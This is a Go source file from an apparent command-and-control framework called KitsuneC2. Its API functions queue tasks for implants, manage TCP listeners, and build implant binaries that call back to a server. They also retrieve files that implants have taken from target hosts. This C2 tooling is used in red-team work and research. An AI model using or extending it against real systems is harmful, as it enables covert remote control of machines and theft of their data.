//This package is used by the CLI and web-api to make changes to application state.

package api

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"KitsuneC2/lib/utils"
	"KitsuneC2/server/builder"
	"KitsuneC2/server/db"
	"KitsuneC2/server/handlers"
	"KitsuneC2/server/listener"
	"encoding/json"
	"errors"
	"log"
	"reflect"
	"strconv"
	"time"
)

var runningsListeners []listener.Listener

// Adds a task to be executed for a specific implant. The taskArguments parameter should be a serializable type, see /lib/serializable
// to see the types of requests a server can make to the implant.
func AddTaskForImplant(implantId string, taskType int, taskArguments *communication.Task) (string, error) {
	log.Printf("[INFO] API: attempting to create task with type %d for implant with ID %s.", taskType, implantId)
	if !ImplantExists(implantId) {
		return "", errors.New("cannot add task for non-existant implant")
	}
	//use reflection to check that taskType and taskArguments correspond
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[taskType]())
	actualType := reflect.TypeOf(*taskArguments).Elem()
	if !actualType.AssignableTo(expectedType) && !reflect.PointerTo(actualType).AssignableTo(expectedType) {
		return "", errors.New("taskType and taskArguments don't correspond")
	}
	id := cryptography.GenerateMd5FromStrings(implantId, strconv.FormatInt(time.Now().UnixNano(), 10))
	(*taskArguments).SetTaskId(id) //Set the taskId of the arguments.

	//Marshal the taskArguments so that the object can be stored in the database
	marshalledTaskData, err := json.Marshal(taskArguments)
	if err != nil {
		return "", err
	}
	var task *db.Implant_task = new(db.Implant_task)
	task.Implant_id = implantId
	task.Task_type = taskType
	task.Task_data = marshalledTaskData
	task.Completed = false
	task.Task_id = id

	err = db.AddTask(task)
	if err != nil {
		return "", err
	}
	return task.Task_id, nil
}

// Remove a task for an implant that is yet to be executed.
func RemovePendingTaskForImplant(implantId string, taskId string) error {
	log.Printf("[INFO] API: Attempting to remove pending task with ID: %s", taskId)
	err := db.RemovePendingTaskForImplant(implantId, taskId)
	return err
}

// Given an implantId, returns tasks belonging to this implant. The "completed" parameter determins whether the tasks returned
// have already been completed and thus have a result.
func GetTasksForImplant(implantId string, completed bool) ([]*db.Implant_task, error) {
	log.Printf("[INFO] API: Attemping to fetch tasks for implant with ID: %s", implantId)
	tasks, err := db.GetTasksForImplant(implantId, completed)
	if err != nil {
		return nil, err
	}
	return tasks, nil
}

// Fetches all tasks for all implants. The completed parameter dictates whether the fetched tasks are completed or not.
func GetAllTasks(completed bool) ([]*db.Implant_task, error) {
	log.Printf("[INFO] API: Attemping to fetch tasks for all implants")
	tasks, err := db.GetAllTasks(completed)
	if err != nil {
		return nil, err
	}
	return tasks, nil
}

// Given a task ID, returns all information about the task.
func GetTask(taskId string) (*db.Implant_task, error) {
	log.Printf("[INFO] API: Attempting to fetch task with ID: %s", taskId)
	task, err := db.GetTask(taskId)
	if err != nil {
		return nil, err
	}
	return task, nil
}

// Checks if implant with implantId exists in our database
func ImplantExists(implantId string) bool {
	log.Printf("[INFO] API: checking if implant with id: %s exists.", implantId)
	_, err := db.GetImplantInfo(implantId)
	if err != nil {
		if err == db.ErrNoResults {
			return false
		} else {
			log.Printf("[ERROR] encountered error while checking for existance of implant with ID: %s. Reason: %s ", implantId, err.Error())
			return false
		}
	}
	return true
}

// Returns information about all implants registered in the DB.
func GetAllImplants() ([]*db.Implant_info, error) {
	log.Printf("[INFO] API: Attempting to fetch all implant information")
	return db.GetAllImplants()
}

// Gets the "active" status from an implant
func GetImplantStatus(implantId string) (bool, error) {
	log.Printf("[INFO] API: Attemping to fetch active-status of implant with ID: %s.", implantId)
	return db.GetImplantStatus(implantId)
}

// Starts a TCP listener on the specified port and network. E.g. network="127.0.0.1" port=4444. Leave network empty to listen
// on all available interfaces.
func AddListener(network string, port int) error {
	log.Printf("[INFO] API: Attempting to start listener on %s:%d", network, port)
	var ls listener.Listener = listener.Listener{Type: "tcp", Handler: handlers.TcpHandler, Network: network, Port: port}
	err := ls.Start()
	if err != nil {
		return err
	}

	runningsListeners = append(runningsListeners, ls)
	return nil
}

// Returns a list of all running jobs
func GetRunningListeners() (*[]listener.Listener, error) {
	log.Printf("[INFO] API: Attemping to get running listeners.")
	if len(runningsListeners) == 0 {
		return nil, errors.New("no listeners running")
	}
	return &runningsListeners, nil
}

// Kills job with given ID.
func KillListener(listenerId int) error {
	log.Printf("[INFO] API: Attemping to kill listener with ID: %d", listenerId)
	if listenerId < 0 || listenerId >= len(runningsListeners) {
		return errors.New("no listener with that ID")
	}
	runningsListeners[listenerId].Stop()
	runningsListeners = append(runningsListeners[:listenerId], runningsListeners[listenerId+1:]...) //removes element from list and shifts other elements
	return nil
}

// Given an implant configuration, invokes go build and generates an implant binary
// os:				Target operating system ("linux", "windows" ....) (see GOOS docs)
// arch:			Target architecture ("amd64", "arm" ....) (see GOARCH docs)
// outFile:			Destination path where binary will be written to
// serverIp:		IP address that implant will callback to
// name:			Name of the implant
// serverPort:		Port that the implant will callback to
// cbInterval:		Interval between callbacks (in seconds)
// cbJitter:		Jitter between intervals (in seconds)
// maxRetryCount:	Number of times an implant will try to reconnect if it can't contact C2 server
func BuildImplant(os, arch, outFile, serverIp, name string, serverPort, cbInterval, cbJitter, maxRetryCount int) (string, error) {

	config := builder.BuilderConfig{ImplantOs: os, ImplantArch: arch, OutputFile: outFile, ServerIp: serverIp, ServerPort: serverPort, ImplantName: name, CallbackInterval: cbInterval, CallbackJitter: cbJitter, MaxRegisterRetryCount: maxRetryCount}

	log.Printf("[INFO] API: Build implant started.")
	if config.ImplantName == "" {
		config.ImplantName = utils.GenerateRandomName()
	}
	if config.ServerPort <= 0 || config.ServerPort >= 65535 {
		return "", errors.New("not a valid port number")
	}
	if !(config.CallbackInterval > 0) {
		return "", errors.New("callback interval must be a positive integer")
	}
	if !(config.CallbackJitter >= 0) {
		return "", errors.New("callback jitter must be a positive integer or 0")
	}
	if !(config.MaxRegisterRetryCount >= 0) {
		return "", errors.New("max retry count must be a positive integer or 0")
	}

	pub, err := db.GetPublicKey()
	if err != nil {
		log.Printf("[ERROR] Could not fetch public key from database while trying to build implant. Reason: %s", err.Error())
		return "", err
	}
	config.PublicKey = pub

	return builder.BuildImplant(&config)
}

// Given an implant ID, removes the implant + all associated tasks from the DB.
func DeleteImplant(implantId string) error {
	log.Printf("[INFO] API: Attemping to remove implant and all associated tasks with ID: %s.", implantId)

	if !ImplantExists(implantId) {
		return errors.New("no such implant")
	}

	return db.RemoveImplant(implantId)
}

// If an implant completes a "download" task, this function will return the path of the downloaded file.
func GetDownloadedFilePathFromTask(taskId string) (string, error) {
	log.Printf("[INFO] API: Fetching downloaded file for task with ID: %s", taskId)

	task, err := GetTask(taskId)
	if err != nil {
		return "", err
	}

	if !task.Completed {
		return "", errors.New("implant hasn't executed task yet")
	}

	if task.Task_type != communication.DOWNLOAD_REQ {
		return "", errors.New("task is not a download task")
	}

	//if (task.Task_result != ""){
	//TODO
	//}

	downloadReq := new(communication.DownloadReq)
	err = json.Unmarshal(task.Task_data, downloadReq)
	if err != nil {
		log.Printf("[ERROR] API: Could not unmarshal task with ID: %s back into its original structure", taskId)
		return "", err
	}

	return downloadReq.Destination, nil
}
